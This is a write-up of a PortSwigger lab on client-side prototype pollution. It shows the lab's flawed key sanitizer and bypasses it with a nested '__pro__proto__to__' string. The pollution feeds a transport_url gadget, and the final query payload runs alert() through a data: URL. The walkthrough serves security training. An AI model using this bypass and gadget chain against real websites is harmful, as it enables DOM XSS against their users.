# Client-side prototype pollution via flawed sanitization

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/prototype-pollution/preventing/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization), you'll learn: Client-side prototype pollution via flawed sanitization! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) via client-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution). Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.

To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript. 
3. Combine these to call `alert()`.
## Exploitation

### Find a source that you can use to add arbitrary properties to the global `Object.prototype`

**To find a source (Inputs that are under attacker's control), we can do it manually:**

1. Try to inject an arbitrary property via the query string, URL fragment, and any web message data. For example:
```js
vulnerable-website.com/?__proto__[foo]=bar
```

2. In the browser console, inspect the `Object.prototype` to see if we have successfully polluted it with our arbitrary property:
```js
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```
   
3. If the property was not added to the global prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
```js
vulnerable-website.com/?__proto__.foo=bar
```

4. Repeat this process for each potential source.

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-5/images/Pasted%20image%2020230122163935.png)

In here, we see there is a search box.

Let's try to search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-5/images/Pasted%20image%2020230122163945.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-5/images/Pasted%20image%2020230122163950.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-5/images/Pasted%20image%2020230122164005.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-5/images/Pasted%20image%2020230122164022.png)

When we clicked the "Search" button, it'll send a GET request to `/` with parameter `search` and our input value. **Also, it'll send a POST request to `/logger` with parameter `search`, and other random parameters.**

**View source page:**
```html
<script src='resources/js/deparamSanitised.js'></script>
<script src='resources/js/searchLoggerFiltered.js'></script>
```

In here, we see there are 2 JavaScript files are loaded.

**`deparamSanitised.js`:**
```js
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );

            keys = keys.shift().split('[').concat( keys );

            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[sanitizeKey(key)] = i < keys_last
                        ? cur[sanitizeKey(key)] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[sanitizeKey(key)].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[sanitizeKey(key)] = [ obj[key], val ];

                } else {
                    obj[sanitizeKey(key)] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};
```

**`searchLoggerFiltered.js`:**
```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}

window.addEventListener("load", searchLogger);
```

In the `searchLoggerConfigurable.js`, we can see that **it's using `fetch()` API to send a POST request to `/logger`.**

**Also, there is a function called `sanitizeKey()`:**
```js
function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}
```

This function will look for string `constructor`, `__proto__`, and `prototype`. **If those evil properties exist, replace them to an empty string (`''`).**

However, we can bypass that very easily, as **it doesn't recursively sanitize the input string.**

**We can exploit that via adding 2 `__proto__` string:**
```js
/?__pro__proto__to__[foo]=bar
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-5/images/Pasted%20image%2020230122164741.png)

We successfully added an arbitrary properties to the global `Object.prototype`!

### Identify a gadget property that allows you to execute arbitrary JavaScript

**In the `searchLoggerFiltered.js`, we see this:**
```js
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```

This function `searchLogger()` has **an object called `config`, and it's attribute `transport_url` is being parsed to an `<script>` element's `src` attribute!**

Armed with above information, we can pollute the `transport_url` attribute the trigger an DOM-based XSS payload!

### Combine these to call `alert()`

**Payload:**
```js
/?__pro__proto__to__[transport_url]=data:,alert(document.domain);
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-5/images/Pasted%20image%2020230122165043.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-5/images/Pasted%20image%2020230122165053.png)

# What we've learned:

1. Client-side prototype pollution via flawed sanitization